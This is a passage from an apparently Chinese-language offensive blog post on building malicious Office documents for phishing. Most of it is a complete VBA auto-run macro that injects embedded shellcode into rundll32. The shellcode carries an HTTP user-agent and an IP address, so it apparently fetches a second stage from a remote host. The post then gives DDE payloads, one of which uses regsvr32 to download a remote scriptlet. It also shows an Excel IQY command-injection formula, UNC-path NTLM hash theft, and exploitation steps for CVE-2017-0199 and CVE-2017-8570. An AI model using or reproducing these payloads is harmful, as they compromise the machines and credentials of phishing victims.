class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDirectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> <span class="built_in">Long</span>, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    <span class="keyword">Dim</span> sProc <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> LongPtr, res <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> <span class="built_in">Long</span>, res <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line">    myArray = Array(<span class="number">-4</span>,<span class="number">-24</span>,<span class="number">-119</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">-119</span>,<span class="number">-27</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">100</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">48</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">20</span>,<span class="number">-117</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">15</span>,<span class="number">-73</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">-63</span>,<span class="number">-49</span>, _</span><br><span class="line"><span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">-30</span>,<span class="number">-16</span>,<span class="number">82</span>,<span class="number">87</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">16</span>,<span class="number">-117</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-117</span>,<span class="number">64</span>,<span class="number">120</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">74</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">80</span>,<span class="number">-117</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-29</span>,<span class="number">60</span>,<span class="number">73</span>,<span class="number">-117</span>,<span class="number">52</span>,<span class="number">-117</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">-42</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">-63</span>,<span class="number">-49</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">56</span>,<span class="number">-32</span>,<span class="number">117</span>,<span class="number">-12</span>,<span class="number">3</span>,<span class="number">125</span>,<span class="number">-8</span>,<span class="number">59</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">-30</span>,<span class="number">88</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">102</span>,<span class="number">-117</span>,<span class="number">12</span>,<span class="number">75</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-117</span>,<span class="number">4</span>, _</span><br><span class="line"><span class="number">-117</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-119</span>,<span class="number">68</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">91</span>,<span class="number">91</span>,<span class="number">97</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">-1</span>,<span class="number">-32</span>,<span class="number">88</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">-117</span>,<span class="number">18</span>,<span class="number">-21</span>,<span class="number">-122</span>,<span class="number">93</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">84</span>,<span class="number">104</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">-89</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-23</span>,<span class="number">-124</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-55</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">106</span>,<span class="number">3</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">104</span>,<span class="number">-46</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">87</span>,<span class="number">-119</span>,<span class="number">-97</span>, _</span><br><span class="line"><span class="number">-58</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-21</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">82</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">-124</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">82</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-21</span>,<span class="number">85</span>,<span class="number">46</span>,<span class="number">59</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-58</span>,<span class="number">-125</span>,<span class="number">-61</span>,<span class="number">80</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">-1</span>,<span class="number">83</span>,<span class="number">86</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">45</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">123</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">15</span>,<span class="number">-124</span>,<span class="number">-61</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-123</span>,<span class="number">-10</span>,<span class="number">116</span>,<span class="number">4</span>,<span class="number">-119</span>,<span class="number">-7</span>,<span class="number">-21</span>,<span class="number">9</span>,<span class="number">104</span>,<span class="number">-86</span>,<span class="number">-59</span>,<span class="number">-30</span>,<span class="number">93</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-63</span>,<span class="number">104</span>,<span class="number">69</span>,<span class="number">33</span>,<span class="number">94</span>,<span class="number">49</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">7</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-73</span>,<span class="number">87</span>,<span class="number">-32</span>,<span class="number">11</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-65</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">57</span>,<span class="number">-57</span>,<span class="number">116</span>,<span class="number">-73</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-23</span>,<span class="number">-111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-23</span>,<span class="number">-55</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-24</span>,<span class="number">-117</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-1</span>,<span class="number">-1</span>,<span class="number">47</span>,<span class="number">74</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">71</span>,<span class="number">-37</span>,<span class="number">19</span>,<span class="number">-87</span>,<span class="number">58</span>,<span class="number">-110</span>,<span class="number">11</span>,<span class="number">66</span>,<span class="number">63</span>,<span class="number">40</span>,<span class="number">-36</span>,<span class="number">-114</span>,<span class="number">-75</span>,<span class="number">-101</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">29</span>,<span class="number">-115</span>,<span class="number">-75</span>,<span class="number">-106</span>,<span class="number">35</span>,<span class="number">-3</span>,<span class="number">71</span>,<span class="number">126</span>,<span class="number">24</span>,<span class="number">-107</span>,<span class="number">101</span>,<span class="number">80</span>,<span class="number">116</span>,<span class="number">13</span>,<span class="number">70</span>,<span class="number">52</span>, _</span><br><span class="line"><span class="number">101</span>,<span class="number">6</span>,<span class="number">59</span>,<span class="number">-12</span>,<span class="number">-45</span>,<span class="number">32</span>,<span class="number">103</span>,<span class="number">-104</span>,<span class="number">10</span>,<span class="number">62</span>,<span class="number">77</span>,<span class="number">18</span>,<span class="number">-84</span>,<span class="number">12</span>,<span class="number">58</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">56</span>,<span class="number">-75</span>,<span class="number">32</span>,<span class="number">-39</span>,<span class="number">8</span>,<span class="number">-80</span>,<span class="number">107</span>,<span class="number">-43</span>,<span class="number">108</span>,<span class="number">71</span>,<span class="number">63</span>,<span class="number">20</span>,<span class="number">41</span>,<span class="number">-82</span>,<span class="number">-42</span>,<span class="number">23</span>,<span class="number">58</span>,<span class="number">-126</span>,<span class="number">98</span>,<span class="number">-100</span>,<span class="number">-108</span>,<span class="number">-126</span>,<span class="number">76</span>, _</span><br><span class="line"><span class="number">-44</span>,<span class="number">0</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">45</span>,<span class="number">65</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">77</span>, _</span><br><span class="line"><span class="number">83</span>,<span class="number">73</span>,<span class="number">69</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">66</span>,<span class="number">79</span>, _</span><br><span class="line"><span class="number">73</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">53</span>,<span class="number">-24</span>,<span class="number">107</span>,<span class="number">-26</span>,<span class="number">-93</span>,<span class="number">106</span>,<span class="number">-40</span>,<span class="number">-71</span>,<span class="number">-105</span>,<span class="number">-127</span>,<span class="number">-22</span>,<span class="number">100</span>,<span class="number">-16</span>,<span class="number">117</span>,<span class="number">-9</span>,<span class="number">83</span>,<span class="number">112</span>,<span class="number">-101</span>,<span class="number">60</span>,<span class="number">-4</span>,<span class="number">105</span>,<span class="number">72</span>,<span class="number">-127</span>,<span class="number">96</span>,<span class="number">-60</span>, _</span><br><span class="line"><span class="number">-29</span>,<span class="number">27</span>,<span class="number">-62</span>,<span class="number">-29</span>,<span class="number">98</span>,<span class="number">-95</span>,<span class="number">-56</span>,<span class="number">-46</span>,<span class="number">-6</span>,<span class="number">-57</span>,<span class="number">-39</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">-70</span>,<span class="number">101</span>,<span class="number">-16</span>,<span class="number">86</span>,<span class="number">-85</span>,<span class="number">-15</span>,<span class="number">25</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">-46</span>,<span class="number">-118</span>,<span class="number">-62</span>,<span class="number">1</span>,<span class="number">-19</span>,<span class="number">85</span>,<span class="number">56</span>,<span class="number">18</span>,<span class="number">-105</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">102</span>,<span class="number">116</span>,<span class="number">-54</span>,<span class="number">50</span>,<span class="number">-67</span>,<span class="number">81</span>,<span class="number">-20</span>, _</span><br><span class="line"><span class="number">40</span>,<span class="number">-19</span>,<span class="number">-52</span>,<span class="number">101</span>,<span class="number">6</span>,<span class="number">116</span>,<span class="number">118</span>,<span class="number">-128</span>,<span class="number">-118</span>,<span class="number">-9</span>,<span class="number">-46</span>,<span class="number">-96</span>,<span class="number">-122</span>,<span class="number">116</span>,<span class="number">-70</span>,<span class="number">107</span>,<span class="number">-54</span>,<span class="number">-78</span>,<span class="number">59</span>,<span class="number">119</span>,<span class="number">-51</span>,<span class="number">-52</span>,<span class="number">5</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">-9</span>,<span class="number">-60</span>,<span class="number">102</span>,<span class="number">-96</span>,<span class="number">109</span>,<span class="number">-90</span>,<span class="number">-122</span>,<span class="number">-92</span>,<span class="number">-81</span>,<span class="number">34</span>,<span class="number">-70</span>,<span class="number">-106</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">121</span>, _</span><br><span class="line"><span class="number">-6</span>,<span class="number">-5</span>,<span class="number">-12</span>,<span class="number">107</span>,<span class="number">-44</span>,<span class="number">73</span>,<span class="number">-31</span>,<span class="number">52</span>,<span class="number">87</span>,<span class="number">-89</span>,<span class="number">13</span>,<span class="number">77</span>,<span class="number">-121</span>,<span class="number">-68</span>,<span class="number">-37</span>,<span class="number">74</span>,<span class="number">-23</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">-122</span>,<span class="number">79</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">-39</span>,<span class="number">58</span>,<span class="number">121</span>,<span class="number">-100</span>,<span class="number">20</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">27</span>,<span class="number">-15</span>,<span class="number">29</span>,<span class="number">52</span>,<span class="number">-107</span>,<span class="number">127</span>,<span class="number">-89</span>,<span class="number">40</span>,<span class="number">-4</span>,<span class="number">-122</span>, _</span><br><span class="line"><span class="number">-73</span>,<span class="number">-101</span>,<span class="number">75</span>,<span class="number">-64</span>,<span class="number">-59</span>,<span class="number">111</span>,<span class="number">105</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">-121</span>,<span class="number">7</span>,<span class="number">33</span>,<span class="number">-121</span>,<span class="number">58</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">-97</span>,<span class="number">-45</span>,<span class="number">25</span>,<span class="number">105</span>,<span class="number">90</span>,<span class="number">-99</span>,<span class="number">6</span>,<span class="number">38</span>,<span class="number">74</span>,<span class="number">-22</span>,<span class="number">86</span>,<span class="number">17</span>,<span class="number">-99</span>,<span class="number">-58</span>,<span class="number">-36</span>,<span class="number">55</span>,<span class="number">5</span>,<span class="number">-96</span>,<span class="number">-109</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">-66</span>, _</span><br><span class="line"><span class="number">-23</span>,<span class="number">-116</span>,<span class="number">-38</span>,<span class="number">-13</span>,<span class="number">-33</span>,<span class="number">89</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">90</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">-33</span>,<span class="number">-48</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">-76</span>,<span class="number">-11</span>,<span class="number">44</span>,<span class="number">50</span>,<span class="number">-68</span>,<span class="number">-127</span>,<span class="number">-70</span>,<span class="number">-43</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">-16</span>,<span class="number">-75</span>,<span class="number">-94</span>,<span class="number">86</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">88</span>,<span class="number">-92</span>,<span class="number">83</span>,<span class="number">-27</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-109</span>,<span class="number">-71</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-39</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">-119</span>,<span class="number">-25</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">86</span>,<span class="number">104</span>,<span class="number">18</span>,<span class="number">-106</span>,<span class="number">-119</span>,<span class="number">-30</span>,<span class="number">-1</span>,<span class="number">-43</span>, _</span><br><span class="line"><span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">-58</span>,<span class="number">-117</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">-61</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">117</span>,<span class="number">-27</span>,<span class="number">88</span>,<span class="number">-61</span>,<span class="number">-24</span>,<span class="number">-87</span>,<span class="number">-3</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">111</span>,<span class="number">-86</span>,<span class="number">81</span>,<span class="number">-61</span>)</span><br><span class="line">    <span class="keyword">If</span> Len(Environ(<span class="string">"ProgramW6432"</span>)) &gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\SysWOW64\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\System32\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">1</span>&amp;, <span class="keyword">ByVal</span> <span class="number">4</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, <span class="number">0</span>, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    <span class="keyword">For</span> offset = LBound(myArray) <span class="keyword">To</span> UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, <span class="number">1</span>, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;)</span><br><span class="line">    <span class="keyword">Next</span> offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, <span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>代码分析： sProc为rundll32.exe的路径<br>然后RunStff -&gt; CreateProcessA<br>使用rundll32创建进程，然后使用WriteStuff注入shellcode(myArray)</p><p><strong>PS: 同时也可用Msf 或者 Empire等工具生成Macro后门</strong></p><h3 id="Office-DDE"><a href="#Office-DDE" class="headerlink" title="Office DDE"></a>Office DDE</h3><p>Ctrl + F9 （Command + F9）可开启域<br>填入代码即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; \* MERGEFORMAT</span><br></pre></td></tr></table></figure></p><p><img src="/Phishing Attack - 文件落地.resources/F8346748-1553-4C23-BD4E-063A4EA1150C.png" alt="15e498b5fb55042af504a1f99a898b91"></p><p>联动MSF (web_delivery)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://192.168.0.1/A9IcXi.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure></p><p>这种方式回需要受害者确认打开进程，有一定风险</p><h3 id="Excel-IQY"><a href="#Excel-IQY" class="headerlink" title="Excel IQY"></a>Excel IQY</h3><p>IQY是一个Excel Web查询用到的东西，可以直接吧互联网上的东西打印到表中<br>数据-&gt;倒入数据-&gt;新建Web查询<br><img src="/Phishing Attack - 文件落地.resources/CBC34D2AE7ADB278D040CA16FF6E1DF9.jpg" alt="cbc34d2ae7adb278d040ca16ff6e1df9"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/c calc.exe &apos;!A0</span><br></pre></td></tr></table></figure><p>单引号内调用恶意程序<br><img src="/Phishing Attack - 文件落地.resources/6CA2FC83266D62BB018FA05C8DA71CE1.png" alt="6ca2fc83266d62bb018fa05c8da71ce1"></p><p>同样需要受害者确认打开进程</p><h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>OLE - 外部对象<br>常见利用场景见CVE-2017-0199</p><h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>UNC(Universal Naming Convention)<br>就是windows共享进行<br>经典用法:<br><a href="https://github.com/0x09AL/WordSteal" target="_blank" rel="noopener">https://github.com/0x09AL/WordSteal</a></p><p>插入UNC路径的图片窃取目标用户NTMLhash</p><h3 id="Powerpoint-Button"><a href="#Powerpoint-Button" class="headerlink" title="Powerpoint Button"></a>Powerpoint Button</h3><p><img src="/Phishing Attack - 文件落地.resources/7E574267-CC0D-4847-B465-4ACB186D797B.png" alt="9524de25b9403cfff1df3282fc5b914c"></p><p><img src="/Phishing Attack - 文件落地.resources/8F4F1F9B-CFC0-4864-9613-3BC0D57E54EE.png" alt="5050e237bcc98ba0dfd904dfe9ffa4f7"></p><p><img src="/Phishing Attack - 文件落地.resources/7FE8F89E-CE1C-4D53-97AC-8859BC8F6951.png" alt="e63764e020d99c4a5aececdf8cd5c887"></p><h3 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h3><p>利用rtf的特性，可以自启动加载OLE调用的外部组件，通过修改Server的MIME类型，让引用的RTF文档解析为HTA文件，执行命令<br>影响版本：<br><code>Office 2007,Office 2010,Office 2013,Office 2016</code></p><p>注意点：<br>使用Notepad++将生成的rtf文档里的<br><code>\object\objautlink\rsltpict</code>替换为<code>\object\objautlink\objupdate\rsltpict</code></p><p>至于修改File Server的MIME类型:<br>直接在Apache2的主配置中编辑：<br><code>AddType application/rtf .rtf</code></p><h3 id="CVE-2017-8570"><a href="#CVE-2017-8570" class="headerlink" title="CVE-2017-8570"></a>CVE-2017-8570</h3><p>原理：利用RTF文档的Packager.dll搭配%temp%目录，将.sct以Packager对象存入，再用rtf文档去调用他，就可以达到利用.sct调用COM接口来执行命令的效果</p><p><a href="https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py" target="_blank" 